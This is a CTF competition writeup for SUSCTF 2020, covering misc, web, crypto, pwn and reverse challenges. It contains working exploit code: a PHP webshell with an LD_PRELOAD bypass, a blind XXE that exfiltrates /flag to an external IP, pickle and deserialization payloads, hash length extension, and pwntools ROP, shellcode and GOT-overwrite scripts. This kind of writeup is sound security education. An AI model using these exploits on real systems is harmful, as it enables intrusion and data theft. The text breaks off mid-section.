---
title: SUSCTF 2020 Writeup
categories: writeup
tags: [writeup]
---

# WP-schwarzer

- 昵称：schwarzer
- 分数：8610
- 排名：1 

## [misc]爆破鬼才请求出战

![image-20201019221456128](https://timg.reito.fun/archive/typora-schwarzer/image-20201019221456128.png)

是一个加密的压缩包，只有4位待解，写一个脚本破解就行

```python
import zipfile

zfile = zipfile.ZipFile("E:/_IDM/crack.zip")
password = None

def get_next_digit():
    table = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    i = 0
    while i != len(table):
        yield table[i]
        i += 1

while password is None:
    for a in get_next_digit():
        print(a)
        for b in get_next_digit():
            for c in get_next_digit():
                for d in get_next_digit():
                    pwd = "m%ss%s_%stt4%sk!" % (a, b, c, d)
                    try:
                        zfile.extractall(pwd=pwd.encode())
                        print("[+] Found password = " + pwd)
                        password = pwd
                    except Exception as Argument:
                        continue

print("nothing found")
```

正当觉得速度太慢，想用C++写，结果凑巧出结果了

![image-20201020111926596](https://timg.reito.fun/archive/typora-schwarzer/image-20201020111926596.png)

解压出图片，~~misc的图片就是隐写呗，还能有啥~~，查LSB隐写~~就完事了~~。搜了很久，最终用[StegOnline](https://stegonline.georgeom.net/upload)完成解密。

![image-20201020113446667](https://timg.reito.fun/archive/typora-schwarzer/image-20201020113446667.png)

```
S{urgdt1}UY_30__sS0a_04mc
```

我还想了很久，才发现换行分割之后就行了

```
S{urgdt1}
UY_30__s
S0a_04mc
```

按列读出

```
SUS{Y0u_ar3_g00d_4t_m1sc}
```

## [misc]emoji真好玩

按题目提示，先搜搜解密器，在Github上搜到了[解密器](https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17/files/cracker)，用[GitZip](https://kinolien.github.io/gitzip/)下下来，运行。

![image-20201020114706573](https://timg.reito.fun/archive/typora-schwarzer/image-20201020114706573.png)

拿到一个密码，然后再看另一个jphs.jpg，下载[JPHS](http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip)，也是找了一会儿，把图片打开

![image-20201020120818645](https://timg.reito.fun/archive/typora-schwarzer/image-20201020120818645.png)

点击Seek，输入密码，拿到隐藏文件

![image-20201020120945109](https://timg.reito.fun/archive/typora-schwarzer/image-20201020120945109.png)

是个压缩包，解压拿到文件

![image-20201020121012435](https://timg.reito.fun/archive/typora-schwarzer/image-20201020121012435.png)

用脚本转为图片

```python
import matplotlib.pyplot as plt
import os
import sys
import numpy as np

f = open("E:/_IDM/emoji_is_fun/pic.txt", 'r')
data = f.read()
f.close()

image = np.zeros([245, 245])

for r in range(245):
    for c in range(245):
        ptr = r * 245 + c
        if data[ptr] == '1':
            image[r, c] = 255

plt.imshow(image, cmap='gray')
plt.show()
```

运行得到结果

![image-20201020121116224](https://timg.reito.fun/archive/typora-schwarzer/image-20201020121116224.png)

扫码得到flag

```
SUS{1p0ch_wanNA_4_npy5}
```

## [web]原型链污染

对web知识知之甚少，只能光速学习了，搜索了几篇[资料](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)，后来还被放出来当hint。原理不细讲了，大概就是

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}
```

这个`merge`函数有bug，对于json中`__proto__`这个key在merge的时候会污染到原型链

```javascript
let data = req.body
let a = {"fake_flag": true}
let b = {}
merge(b, data)
```

导致data中`__proto__`写入到Object的prototype里，从而使得`a`也有属性`true_flag`，拿到flag

```javascript
if(a.true_flag)
{
    for (let i in {})
    {
        delete Object.prototype[i]
    }
    fs.readFile('/flag', (error, data) => {
        if(error)
        {
            console.log(error)
        }
        else
        {
            res.send(data.toString())
        }
    } 
}
```

因此构造json为

```json
{"a": 1, "__proto__": {"b": 2}}
```

POST到网址，拿到flag

![image-20201020121917884](https://timg.reito.fun/archive/typora-schwarzer/image-20201020121917884.png)

```
SUSCTF{a48e7854e99fa59ed4b843c4f5317826}
```

[web]z33's_pickle

也是没见过的东西，即便做完这题也还没明白python有这个东西的意义，首先访问网址获取网站源码，下面的代码去除了flask库。

```python
import base64
import pickle
import io
import sys 

def read(filename, encoding='utf-8'):  # It is really useful!
    with open(filename, 'r', encoding=encoding) as f:
        return f.read()

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module == '__main__':
            return getattr(sys.modules['__main__'], name)
        raise pickle.UnpicklingError("'%s.%s' is forbidden" % (module, name))

base64_pickle_data = "Y3N5cwptb2R1bGVzCnAwCjA="
if len(base64_pickle_data) > 50:
    print("One inch long,one inch strong!")
pickle_data = base64.b64decode(base64_pickle_data)
result = RestrictedUnpickler(io.BytesIO(pickle_data)).load()
print(result)
```

可以看到题目`# It is really useful!`给出了强烈的提示，在网上搜索了一番关于pickle的资料，发现大多都是以各种方式绕过`find_class`的限制，拿到`system`函数对象，反而忽略了这个提示，因此这个题目只需要拿到`__main__`模块的`read`即可。

通过[pker](https://github.com/eddieivan01/pker)工具生成payload，我魔改了一下脚本，直接生成了base64。

```python
r = GLOBAL('__main__', 'read')
return r('/flag')
```

![image-20201020123020050](https://timg.reito.fun/archive/typora-schwarzer/image-20201020123020050.png)

POST到服务器，获取flag

![image-20201020123147451](https://timg.reito.fun/archive/typora-schwarzer/image-20201020123147451.png)

```
SUSCTF{68a4f1b522745ec22b4065f309bf98ba}
```

## [web]upload_and_bypass

这题题目给出提示，绕过上传文件名检查，以及发送一个webshell，并且要绕过disable_function。同样以前没做过这种题，只能光速学习。

首先了解到`xxx.php/.`这样的文件名可以绕过后缀检查，成功上传，其次在Github上找了[这一个](https://github.com/l3m0n/Bypass_Disable_functions_Shell)现成的webshell，先上传上去看看效果。

```php
<?php
     if(isset($_POST['c']) && isset($_POST['f'])){
     
       $userdir = "upload/".md5($_SERVER['REMOTE_ADDR']);
       if(!file_exists($userdir)){
            mkdir($userdir);
       }
       $content = $_POST['c'];
       $filename = $_POST['f'];
       if(preg_match('/.+\.ph(p[3457]?|t|tml)$/i', $filename)){
          die("go out!");
       }else{
           $f = fopen($userdir."/".$filename, 'w');
           fwrite($f, $content);
           fclose($f);
     }
     }
     else{
         highlight_file(__FILE__);
     }
     
?>
```

了解到文件存放在`/upload/IP的MD5`下，尝试访问

![image-20201020123752311](https://timg.reito.fun/archive/typora-schwarzer/image-20201020123752311.png)

看到有`error_log`，`putenv`，`ini_set`可以被利用。于是选用了该webshell的这个利用函数

```php
function recv_result($result = 'result') {
    $ret = read_file($result);
    @unlink($result);
    return $ret;
}

function ld_preload_exec_cmd($cmd) {
    $so_file = WRITE_DIR . 'system.so';

    if (ARCH === 64) {
        write_file($so_file, hex2bin($GLOBALS['system_so_x64']));
    } else {
        write_file($so_file, hex2bin($GLOBALS['system_so_x32']));
    }

    $cmd_arr = send_cmd($cmd, 'result');
    putenv("EVIL_CMDLINE=" . $cmd_arr[0]);
    putenv("LD_PRELOAD=" . $so_file);

    if (function_exists('error_log')){
        error_log("", 1, "example@example.com");
    } elseif (function_exists('mail')){
        mail("", "", "", "");
    } elseif (function_exists('mb_send_mail')){
        mb_send_mail("","","");
    } elseif ((function_exists('imap_mail'))){
        imap_mail("","","");
    } else {
        @unlink($so_file);
        return FAILURE;
    }

    // del so file
    @unlink($so_file);
    return recv_result($cmd_arr[1]);
}
```

当时比赛时没仔细研究漏洞实现方式，直接拿着用了，话说flag位置不一样真的头大

![image-20201020124544331](https://timg.reito.fun/archive/typora-schwarzer/image-20201020124544331.png)

赛后搜集了漏洞的一些[资料](https://blog.csdn.net/weixin_30326515/article/details/95187919)，最后是flag

```
SUSCTF{b8562faa894ea00c3de86eebbc5bd03a}
```

## [web]Ez_escape1

这题的filter函数可以使得序列化产生的长度与实际长度不符，因此把payload放在后面，再在前面放上payload长度一半的`nzgnb`即可

```
nzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnbnzgnb";s:6:"number";i:1008611;}
```

发送给服务器拿到flag，再进行解码

![image-20201020125207133](https://timg.reito.fun/archive/typora-schwarzer/image-20201020125207133.png).

```
SUSCTF{54ca2dc67a447afb7765df613c89993b}
```

## [web]Ez_escape2

我是先做的这题再做的escape1，甚至觉得2比1简单，一样先访问服务器获取php源码，filter函数会把`Haidilao`替换成`Hedilao`，因此每一个海底捞都会导致反序列化时多一字符被吞掉，因此我想吞到下文`TRY`的前一个单引号即可

```php
O:7:"escape2":3:{s:8:"haidilao";s:6:"FILLME";s:4:"core";s:3:"TRY";s:3:"num";s:4:"2019";}
```

这样反序列化会把前面的当成值，在`core`里重新构造即可，注意对象数要保持和前面3一致

```php
";s:3:"num";s:4:"2020";s:3:"num";s:4:"2020";}
```

提交服务器，拿到flag，并解码

![image-20201020125937704](https://timg.reito.fun/archive/typora-schwarzer/image-20201020125937704.png)

```
SUSCTF{406d6380460596a5de2a51a44b56ec1c}
```

## [web]baby_php

题目给出提示，php拓展攻击，~~继续学习~~。

<img src="image-20201020125937704.png" alt="image-20201020130200422" style="zoom:50%;" />

猫猫攻击，拿Fiddler抓个包吧

```html
<!-- <h1>the param is file<h1> --><img src=sus.jpg>
```

提示参数是file，再看看

![image-20201020130547474](https://timg.reito.fun/archive/typora-schwarzer/image-20201020130547474.png)

返回了index.php

```php
include('config.php');
include('function.php');
if(!$_GET['file']){
    echo "<!-- <h1>the param is file<h1> -->";
    echo "<img src=sus.jpg>";
} else {
    $file=$_GET['file'];
    $ext = "sus_2020";
    setcookie('hash',hash("sha256",$secret.$ext));
    if(is_safe($file))
    {
        if($file==="index.php"){
            highlight_file('index.php');
        } else {
            include($file);
        }
    }
    if($_GET['action']==='get_flag')
    {
        if(check_admin()===1)
        {
            readfile('/flag');
        }
    }
}
```

并且获得了一个cookie

```
hash=ef85488d067bee0bf0b4a3277f8de24768697cbec5a0bc470ed5451c54ac81b1;
```

一开始毫无头绪，首先查了一下题目的提示，hash拓展攻击，具体可以百度，大体意思就是对于明文`??????????SSSSSS`，知道`?`的长度，不需要知道内容，就可以构造出另一个明文。

再看题目，`$secret`就是`?`，`$ext`是`sus_2020`。但我想了半天，还是毫无头绪，盯着看了许久，觉得`include`没必要，搜搜有没有可以利用的地方，果然有问题，通过php的自己协议，可以把某文件以php形式读出，即`php://filter/read=convert.base64-encode/resource=index.php`,

![image-20201020131919210](https://timg.reito.fun/archive/typora-schwarzer/image-20201020131919210.png)

那真的牛逼，再试试`function.php`

![image-20201020131947508](https://timg.reito.fun/archive/typora-schwarzer/image-20201020131947508.png)

解码之后获取源码

```php
#tips:the length of secret is 10
function is_safe($filename){
    $tmp_file = str_replace("../","",$filename);
    if($tmp_file!==$filename) {
        die('no no no~');
    }
    if (stripos($filename,"config")!==FALSE or stripos($filename,"flag")!==FALSE) {
        die('fxxk hacker!');
    }
    else {
        return 1;
    }
}
function check_admin(){
    global $secret;
    $id=urldecode($_POST['id']);
    if(is_array($id)) {
        die("no no no");
    }
    if($id!==""&&$_COOKIE['user']===hash("sha256",$secret.$id.'sus_2020')) {
        return 1;
    } else {
        return 0;
    }
}
```

可以见到被fxxk的原因了，也能看到我们的目标，在cookie里设置一个payload，并提交id，使得两者hash相同。与网上资料不同的是，一般教程都是`$secret.$ext.$id`形式，这里是`$secret.$id.$ext`。不过我突然想`id`也变成`sus_2020`不就行了。

通过一个叫hashpump的东西生成了payload

![image-20201020132930564](https://timg.reito.fun/archive/typora-schwarzer/image-20201020132930564.png)

使得id为

```
sus_2020%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90
```

即可根据hash函数的特性计算出下文

```
xxxxxxxxxxsus_2020%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90sus_2020
```

的hash为

```
5db9b98600777e422f3f7d08e705cb9fbab8d416fcf29f4756b6e41994f1e331
```

提交给服务器，拿到flag

![image-20201020133031305](https://timg.reito.fun/archive/typora-schwarzer/image-20201020133031305.png)

```
SUSCTF{d2303097072bc6be9607722cb10ef191}
```

## [web]baby_java1

开屏是登录界面，题目提示了解一下java xxe，那就去了解一下呗。（写wp的时候发现做这题用到的云服务器实例给我自动释放了，~~***~~。）

![image-20201020133221322](https://timg.reito.fun/archive/typora-schwarzer/image-20201020133221322.png)

了解了一番，总的来说，就是通过利用登录提交的信息是xml这一特点

![image-20201020133554492](https://timg.reito.fun/archive/typora-schwarzer/image-20201020133554492.png)

可以通过构造一个xml，包含一些恶意的信息使得解析的时候获取服务器的一些信息。做这题你需要有一个公网IP，不过我为了图省事用了我自己的阿里云OSS和一个按量付费的ECS实例。

首先尝试看看能否直接通过有回显这一特性提取文件

![image-20201020133837998](https://timg.reito.fun/archive/typora-schwarzer/image-20201020133837998.png)

结果被检测了，又去网上搜了一番，把这题当作无回显的做了，具体就是在OSS（或其他文件服务器）上放上一个dtd脚本，使得xml解析器访问某网址并带上参数。

其中要在另一远程地址放上（IP替换成自己的）

```xml-dtd
<!ENTITY % all
"<!ENTITY &#x25; ssss SYSTEM 'http://116.62.4.84:6757/%ffff;'>"
>
%all;
```

在ECS上监听端口

![image-20201020134917181](https://timg.reito.fun/archive/typora-schwarzer/image-20201020134917181.png)

然后发送给服务器

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE user[
<!ENTITY % ffff SYSTEM "file:///flag.txt">
<!ENTITY % ddd SYSTEM "http://schwarzer-blog.oss-cn-hangzhou.aliyuncs.com/baby.dtd">
%ddd;
%ssss;
]>
<user><number>admin</number><name>hahaha</name></user>
```

![image-20201020135025094](https://timg.reito.fun/archive/typora-schwarzer/image-20201020135025094.png)

![image-20201020134948972](https://timg.reito.fun/archive/typora-schwarzer/image-20201020134948972.png)

服务器会向ECS请求，拿到flag

```
flag{java_xxe_is_so_easy}
```

## [web]AA_is_who

签到题，没什么好说的（👴写累了）

![image-20201020135227689](https://timg.reito.fun/archive/typora-schwarzer/image-20201020135227689.png)

拿到flag

```
SUSCTF{AA_Is_Aryb1n!}
```

## [crypto]看图算数

crypto虽然也没做过，但是和web比那就难太多了（原理方面），这题只能搜，查到[一篇](https://mlzeng.com/an-interesting-equation.html)解析的很全面的。

```
x = 36875131794129999827197811565225474825492979968971970996283137471637224634055579
y = 154476802108746166441951315019919837485664325669565431700026634898253202035277999
z = 4373612677928697257861252602371390152816537558161613618621437993378423467772036
```

总之给出答案了，但是题目要求给出10个解，那就都*10就行了，最后得到flag

```
SUSCTF{Y0u_k0nw_EllipseCurve_0r_SearchEngine}
```

## [crypto]random_flag

首先从群文件获取服务器脚本

```python
#!/usr/bin/python3
from tools import *
import numpy as np
import random

def random_encode(s):
    s=np.array(bytearray(s.encode()))
    box=random.sample(range(len(s)),size)
    s[sorted(box)]=s[box]
    return bytes(s).decode()

check()
print('正在生成你的专属flag...')
code=get_hash()
size=len(code)
flag='SUSCTF{%s}'%code
for i in range(100):
    choice=input('choice:')
    if choice=='1':
        print(random_encode(flag))
    elif choice=='2':
        check_flag(input('flag:'),flag)
        print('flag已成功录入数据库，可以提交了！')
        close()
    else:
        close()
close()
```

分析可知，首先服务器生成一个flag，随后通过在40个字符中随机取样32个并打乱，返回。实验得知，对一个用户名flag是不会变的，因此写一个脚本，对每一个字符位置进行统计，取最大出现频率的即为flag。

```python
from pwn import *

table = list()
for k in range(40):
    table.append({})
    
while True:
    conn = remote('susctf.com', 10031)

    print(conn.recv(20, 0.3))
    conn.sendline('schwarzer')
    print(conn.recv(20, 0.3))
    conn.sendline('wzw2008')
    print(conn.recvline())

    for i in range(100):

        print(conn.recv(7))
        conn.sendline('1')
        flag_chaos = conn.recvline()
        print(flag_chaos)

        flag_chaos = flag_chaos[:-2].decode()

        if len(flag_chaos) == 40:
            for k in range(40):
                flag_char = flag_chaos[k]
                table_dict = table[k]
                if flag_char in table_dict.keys():
                    table_dict[flag_char] = table_dict[flag_char] + 1
                else:
                    table_dict[flag_char] = 1

    flag_out = ''
    for k in range(40):
        table_dict = table[k]
        max_char = '?'
        max_char_count = 0
        for key in table_dict.keys():
            if table_dict[key] > max_char_count:
                max_char = key
                max_char_count = table_dict[key]
        flag_out += max_char
    print(flag_out)

```

运行脚本，几百次后可以算出flag

![image-20201020162255108](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162255108.png)

```
SUSCTF{77b08dd5f20c447740c2fbd89502bb9b}
```

## [pwn]babync

签到题，直接`cat /flag/flag.txt`

```
SUSCTF{61e32be7149c0c92e3cd1a41288b10b1}
```

## [pwn]eznc

这题提供了[源码](https://pan.baidu.com/s/1yVjtBgbhbO5rvuVkwRbYCw)，主要就是过滤了很多字符。搜索了一番，发现linux可以用`$`来访问环境变量，后来想起来好像一些脚本里用`$0, $1`访问`argv`，在自己机子上试了下。

![image-20201020144437092](https://timg.reito.fun/archive/typora-schwarzer/image-20201020144437092.png)

那么直接输入`$0`，远端将执行`system("$0")`，完成题目，获取flag。

```
SUSCTF{1fb239c45249db2810e94b203b305c1e}
```

## [pwn]ezgot

如名字所说，肯定是改got表啦。解压发现这题给了libc。

![image-20201020144706363](https://timg.reito.fun/archive/typora-schwarzer/image-20201020144706363.png)

![image-20201020144749445](https://timg.reito.fun/archive/typora-schwarzer/image-20201020144749445.png)

任意地址写，程序给了`printf`基地址，那就把`system`写入`puts`就行了。

![image-20201020144853727](https://timg.reito.fun/archive/typora-schwarzer/image-20201020144853727.png)

分析libc，得知`printf`在`0x55810`，`system`在`0x453A0`，给出脚本

```python
from pwn import *

conn = remote('146.56.223.95', 20003)

conn.recv(10)
conn.recv(23)

printf_str = conn.recvline(False);

print(printf_str)
printf_addr = int(printf_str, 16)
write_to = 0x601018
write_what = printf_addr + (0x453A0 - 0x55810)

write_to_str = p64(write_to, endian='little')
write_what_str = p64(write_what, endian='little')

print(conn.recv(100, 2))
conn.send(write_to_str)
print(conn.recv(100, 2))
conn.send(write_what_str)
print(conn.recv(100, 2))
conn.send('cat /flag/flag.txt')

print(conn.recvall(2))

conn.close()
```

获取flag

![image-20201020145054025](https://timg.reito.fun/archive/typora-schwarzer/image-20201020145054025.png)

```
SUSCTF{5ae87c7d892c5fd991068ab42a727ac6}
```

## [pwn]ezprintf

这题也给了`libc`

![image-20201020145559506](https://timg.reito.fun/archive/typora-schwarzer/image-20201020145559506.png)

丢进IDA看F5

![image-20201020145215792](https://timg.reito.fun/archive/typora-schwarzer/image-20201020145215792.png)

首先讲解一下预期解，因为堆题做得少，虽然感到奇怪，不过没理会`free`的用处，根本不知道`free`有`free_hook`。这题正确解法就是`buf`里写命令，然后把`system`通过`printf`任意地址写写进去。这里我就不验证了，下面介绍我的非预期解，同样也是通过`printf`任意地址写，但首先我看到了

![image-20201020145857616](https://timg.reito.fun/archive/typora-schwarzer/image-20201020145857616.png)

首先想到的是ret2libc，我就手动往栈上写了一个ROP，最终拿到了flag。`printf`能看到的东西不多，首先运行gdb动态调试看一下。在`printf`处下断点。

![image-20201020150651010](https://timg.reito.fun/archive/typora-schwarzer/image-20201020150651010.png)

查看一下堆栈

![image-20201020150727305](https://timg.reito.fun/archive/typora-schwarzer/image-20201020150727305.png)

先通过`%p`确定一下位置

```
What do you want to say
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
you say:
0x7f30083ec7e30x7f30083ed8c00x7fffc004d0100x8(nil)0x7fffc004d2600x7f3008800b6c0x70257025702570250x70257025702570250x70257025702570250xa702570257025(nil)(nil)0x7fffc73e77800xdbf61f831d8b3a00
```

因此计算出`__libc_start_main+231`是`%17$p`。脚本开写

```python
from pwn import *

conn = remote('146.56.223.95', 20005)
# conn = process("/home/schlinux/ezprintf")

print(conn.recvline())
conn.send("schwarzer")

print(conn.recvline())
print(conn.recvline())
conn.sendline("%17$p")
print(conn.recvline())
libc_start_main_str = conn.recvline(False)
print(libc_start_main_str)
libc_start_main = int(libc_start_main_str, 16) - 231
# system = 0x4F4E0
system_ptr = libc_start_main + (0x4F4E0 - 0x21AB0)
libc_base = libc_start_main - 0x21AB0
```

可以计算出libc的基地址，下面我还需要程序基地址信息，观察栈可知`%41$p`可知`hlt`就可以算出。

![image-20201020151707980](https://timg.reito.fun/archive/typora-schwarzer/image-20201020151707980.png)

```python
print(conn.recvline())
conn.sendline("%41$p")
print(conn.recvline())
hlt_str = conn.recvline(False)
print(hlt_str)
hlt = int(hlt_str, 16)
proc_base = hlt - 0x84A
```

还需要写入ROP的位置，观察到`%19$p`指向栈，则可以轻易算出。

![image-20201020151840897](https://timg.reito.fun/archive/typora-schwarzer/image-20201020151840897.png)

```python
print(conn.recvline())
conn.sendline("%19$p")
print(conn.recvline())
argv_str = conn.recvline(False)
print(argv_str)
argv_ptr = int(argv_str, 16)
ret_ptr = argv_ptr - 0xE0
```

最后就是构造ROP了，通过以下命令在libc中寻找

```
ROPgadget --binary ./libc6_2.27-3ubuntu1.2_amd64.so --only "pop|ret|syscall"
```

```
0x0000000000130889 : pop rdx ; pop rsi ; ret
0x000000000002155f : pop rdi ; ret
0x0000000000043a78 : pop rax ; ret
0x00000000000013c0 : syscall
```

构造payload脚本如下

```python
pop_rdx_rsi_ret = libc_base + 0x130889 # 0
rdx = 0 # 8
rsi = 0 # 16
pop_rax_ret = libc_base + 0x43A78 # 24
rax = 59 # 32
pop_rdi_ret = proc_base + 0xB13 # 40
rdi = ret_ptr + 64 # 48
syscall = libc_base + 0x13C0 # 56
bin_sh = u64('/bin/sh\0'.encode()) # 64 

def write_int64(data, addr):
    for i in range(0, 8):
        print(conn.recvline())
        byte_val = p64(data)[i]
        if byte_val != 0:
            byte_str = "%" + str(byte_val) + "c%10$hhn"
        else:
            byte_str = "%10$hhn"
        byte_str_pad = (byte_str + '\0' * (16 - len(byte_str))).encode() + p64(addr + i)
        print(byte_str_pad)
        conn.send(byte_str_pad)
        print(conn.recvline())

write_int64(pop_rdx_rsi_ret, ret_ptr)
write_int64(rdx, ret_ptr + 8)
write_int64(rsi, ret_ptr + 16)
write_int64(pop_rax_ret, ret_ptr + 24)
write_int64(rax, ret_ptr + 32)
write_int64(pop_rdi_ret, ret_ptr + 40)
write_int64(rdi, ret_ptr + 48)
write_int64(syscall, ret_ptr + 56)
write_int64(bin_sh, ret_ptr + 64)
```

最终发送`exit`结束循环，获取shell。

![image-20201020152521077](https://timg.reito.fun/archive/typora-schwarzer/image-20201020152521077.png)

```
SUSCTF{50ac2f9b6f08d2762fa6bdf6b681f1e8}
```

## [pwn]lock

![image-20201020154506659](https://timg.reito.fun/archive/typora-schwarzer/image-20201020154506659.png)

首先看到一个简单点加密算法，在本地同步解密即可。话不多说， 看脚本

```python
from pwn import *
from ctypes import *

conn = remote('146.56.223.95', 20051)
#conn = process('/home/schlinux/lock')

print(conn.recvlines(12))
this_rand_str = conn.recvline().decode()
this_rand = int(this_rand_str[this_rand_str.find(':') + 1:])
print(this_rand_str)
print(this_rand)

libc = cdll.LoadLibrary("libc.so.6")
libc.srand(this_rand)
xor_item = libc.rand() % 10 + 65
print(xor_item)

payload_100 = xor(100, xor_item)
payload_91 = xor(91, xor_item)
payload = payload_100 + payload_100 + payload_91

print(conn.recv(200, 1))

conn.send(payload)
```

首先通过调用`ctype`调用`srand`与`rand`生成一个xor值，给3个数保证和为291就行了。

![image-20201020155239986](https://timg.reito.fun/archive/typora-schwarzer/image-20201020155239986.png)

随后进入`gift`，可见`buf`大小为`0X50`，明显是ret2text

![image-20201020155354685](https://timg.reito.fun/archive/typora-schwarzer/image-20201020155354685.png)

构建payload就完事了，shellcode在[网上](https://www.exploit-db.com/)找的，最后写入栈地址就行。

```python
buf_start_str = conn.recvline().decode()
print(buf_start_str)
buf_start = int(buf_start_str[buf_start_str.find(':') + 1:], 16)
print(hex(buf_start))

payload = bytes([0x48, 0x31, 0xc0, 0x48, 0x83, 0xc0, 0x3b, 0x48, 0x31, 0xff, 0x57, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48,
                 0x8d, 0x3c, 0x24, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05])
payload_pad = payload + ('A'*(88 - len(payload))).encode() + p64(buf_start)

print(conn.recv(100, 1))
conn.send(payload_pad)

conn.sendline('cat /flag/flag.txt')
print(conn.recvall(1))
```

![image-20201020155524798](https://timg.reito.fun/archive/typora-schwarzer/image-20201020155524798.png)

获取到flag

```
SUSCTF{ade58670fab14e8356c94fc6d8f60184}
```

## [pwn]babystack

![image-20201020155824397](https://timg.reito.fun/archive/typora-schwarzer/image-20201020155824397.png)

签到题，显然在指定位置比对正确即可。直接上脚本

```python
from pwn import *

conn = remote('146.56.223.95', 20006)
conn.recv(10000, 1)
conn.sendline(' '*48 + 'btis_wants_girlfriends' + '\0');

conn.sendline('cat /flag/flag.txt')
print(conn.recvall(1))
```

![image-20201020155921469](https://timg.reito.fun/archive/typora-schwarzer/image-20201020155921469.png)

```
SUSCTF{803f7b0ed73d0233f1daefdf4385f700}
```

## [pwn]babyrop

![image-20201020160040996](https://timg.reito.fun/archive/typora-schwarzer/image-20201020160040996.png)

签到题，导入了`system`

![image-20201020160149464](https://timg.reito.fun/archive/typora-schwarzer/image-20201020160149464.png)

因此构造一个payload，首先压入`pop rdi; ret;`的地址，然后`/bin/sh`的地址，再返回到`0x601028`即可

```
0x0000000000400763 : pop rdi ; ret
```

```python
from pwn import *

conn = remote('146.56.223.95', 20007)
conn.recv(10000, 1)
payload = ('A'*104).encode()
payload += p64(0x400763)
payload += p64(0x601050)
payload += p64(0x400540)
conn.sendline(payload);

conn.sendline('cat /flag/flag.txt')
print(conn.recvall(1))
```

写入，拿到flag。

![image-20201020160612764](https://timg.reito.fun/archive/typora-schwarzer/image-20201020160612764.png)

```
SUSCTF{cc3acff78a7bd187ef81be94a79b660f}
```

## [pwn]babydoor

比上一题还简单

![image-20201020160759589](https://timg.reito.fun/archive/typora-schwarzer/image-20201020160759589.png)

直接返回到该函数地址即可。

```python
from pwn import *

conn = remote('146.56.223.95', 20008)
conn.recv(10000, 1)
payload = ('A'*104).encode()
payload += p64(0x400676)
conn.sendline(payload);

conn.sendline('cat /flag/flag.txt')
print(conn.recvall(1))
```

得到flag

```
SUSCTF{46cbf38fd6c8a659c92d829c02c52389}
```

## [pwn]snake

纯玩的，~~怎么，还要再玩一次？~~

## [re]迷宫

首先看反编译

![image-20201020161123216](https://timg.reito.fun/archive/typora-schwarzer/image-20201020161123216.png)

再看一下迷宫

![image-20201020161215633](https://timg.reito.fun/archive/typora-schwarzer/image-20201020161215633.png)

```
******** →y
**...#**
**.*****
**..****
***...**
*****.**
**....**
**.*****
↓x
```

初始坐标是`x=1, y=5`

![image-20201020161310783](https://timg.reito.fun/archive/typora-schwarzer/image-20201020161310783.png)

那么照着迷宫和移动方式可以解出

```
LLLDDRDRRDDLLLD
```

得到flag

```
SUSCTF{DLLLDDRRDRDDLLLLLLDDRDRRDDLLLD}
```

## [re]表面

看不到的是对的，那让他看见不就行了？

![image-20201020162029357](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162029357.png)

Patch这段代码，使其调用`puts`直接打印答案

![image-20201020162138748](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162138748.png)

![image-20201020162206255](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162206255.png)

瞅了半天

```
SUSCTF{all_the_alphabets}
```

## [re]等待

签到题，原文件我就不下了，反正就是把`sleep`参数改成0

![image-20201020162415828](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162415828.png)

拿到flag

![image-20201020162435187](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162435187.png)

```
SUSCTF{RRRRCCCC4444_nnnn0000pppp}
```

## [re]APK

~~鬼鬼，这个难度跨度也忒大了~~。安卓逆向题，运行APP给出提示

![image-20201020162639182](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162639182.png)

那就在这三个里面找，首先用`ApkToolBox`解包，搜索flag搜出第一部分

![image-20201020162749988](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162749988.png)

```
SUSCTF{xml241_
```

凭经验判断您可能又是360加固宝的受害者，然后看一下so文件里有啥

![image-20201020162912656](https://timg.reito.fun/archive/typora-schwarzer/image-20201020162912656.png)

找到了第二段flag

```
_so5123}
```

最后再去看dex，用jadx先看下。

![image-20201020163053736](https://timg.reito.fun/archive/typora-schwarzer/image-20201020163053736.png)

看到这个直接dumpdex就行了，我是用frida再找个[脚本](https://github.com/dstmath/frida-unpack)（当然还要稍作修改，因为脚本和我的函数签名一样，否则去拉`libart.so`）进行dump，专门调试安卓的机子没带到学校，拿网易mumu模拟器做的。首先把frida-server扔进去，然后挂载到`OpenMemory`上（模拟器安卓6.0），脚本负责启动`three.six.zero`。直接拿下。首先启动安卓服务端。

```
adb connect 127.0.0.1:7555
adb shell
./data/local/frida-server
```

随后启动dump脚本

![image-20201020163928662](https://timg.reito.fun/archive/typora-schwarzer/image-20201020163928662.png)

把dex们都pull出来，拿jadx看一下

![image-20201020164008246](https://timg.reito.fun/archive/typora-schwarzer/image-20201020164008246.png)

于是乎按360顺序拼接起来，得到flag

```
SUSCTF{xml241__dex7451}_so5123}
```

## [re]危机合约

~~写这题时还没想着能拿第一，纯当没见过长长见识。~~题目给出提示

```
0x6a647c42b09bec0c1b574c222f4ae7a0c2a17e6461fc31cd987ac60012803ab7 of Ropsten
0xe3B3D81Ab33640c6b67D6bf7aEB8bF1d04ca016a of Ropsten
```

那就搜一下Ropsten是个啥，一看傻了，什么以太坊，看样子是区块链？打开有个搜索功能，看看第一个

